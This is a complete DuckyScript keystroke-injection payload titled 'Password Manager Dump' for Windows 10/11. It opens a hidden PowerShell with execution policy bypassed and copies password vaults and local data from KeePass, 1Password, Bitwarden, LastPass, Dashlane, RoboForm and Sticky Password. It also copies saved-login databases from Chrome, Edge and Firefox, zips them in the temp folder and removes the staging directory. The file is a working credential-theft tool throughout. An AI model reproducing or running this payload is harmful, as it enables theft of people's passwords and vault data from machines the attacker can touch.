REM =============================================
REM Title: Password Manager Dump
REM Author: bad-antics
REM Description: Extract data from password managers
REM Category: nullsec/exfil
REM Target: Windows 10/11
REM =============================================

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 800

REM Create loot directory
STRING $d="$env:TEMP\pwmloot";mkdir $d -Force|Out-Null
ENTER
DELAY 200

REM KeePass database files
STRING Get-ChildItem "$env:USERPROFILE" -Include "*.kdbx","*.kdb" -Recurse -ErrorAction SilentlyContinue|Select -First 10|%{cp $_.FullName "$d\"}
ENTER
DELAY 500

REM 1Password local data
STRING if(Test-Path "$env:LOCALAPPDATA\1Password"){cp -r "$env:LOCALAPPDATA\1Password\data" "$d\1password" -Force 2>$null}
ENTER
DELAY 300

REM Bitwarden local data
STRING if(Test-Path "$env:APPDATA\Bitwarden"){cp "$env:APPDATA\Bitwarden\data.json" "$d\bitwarden_data.json" 2>$null}
ENTER
DELAY 200

REM LastPass local cache
STRING if(Test-Path "$env:LOCALAPPDATA\LastPass"){cp -r "$env:LOCALAPPDATA\LastPass" "$d\lastpass" -Force 2>$null}
ENTER
DELAY 300

REM Dashlane data
STRING if(Test-Path "$env:APPDATA\Dashlane"){cp -r "$env:APPDATA\Dashlane" "$d\dashlane" -Force 2>$null}
ENTER
DELAY 200

REM RoboForm data
STRING if(Test-Path "$env:LOCALAPPDATA\RoboForm"){cp -r "$env:LOCALAPPDATA\RoboForm\Profiles" "$d\roboform" -Force 2>$null}
ENTER
DELAY 200

REM Sticky Password
STRING if(Test-Path "$env:APPDATA\Sticky Password"){cp -r "$env:APPDATA\Sticky Password" "$d\stickypassword" -Force 2>$null}
ENTER
DELAY 200

REM Browser saved passwords (Chrome, Firefox, Edge)
STRING $chromePath="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";if(Test-Path "$chromePath\Login Data"){cp "$chromePath\Login Data" "$d\chrome_logins.db"}
ENTER
DELAY 200

STRING $edgePath="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default";if(Test-Path "$edgePath\Login Data"){cp "$edgePath\Login Data" "$d\edge_logins.db"}
ENTER
DELAY 200

STRING $ffProfiles="$env:APPDATA\Mozilla\Firefox\Profiles";if(Test-Path $ffProfiles){Get-ChildItem $ffProfiles -Directory|%{cp "$($_.FullName)\logins.json" "$d\ff_logins_$($_.Name).json" 2>$null;cp "$($_.FullName)\key4.db" "$d\ff_key4_$($_.Name).db" 2>$null}}
ENTER
DELAY 300

REM Compress
STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\pwmgr_$(hostname).zip" -Force
ENTER
DELAY 400

STRING Remove-Item $d -Recurse -Force
ENTER

STRING exit
ENTER
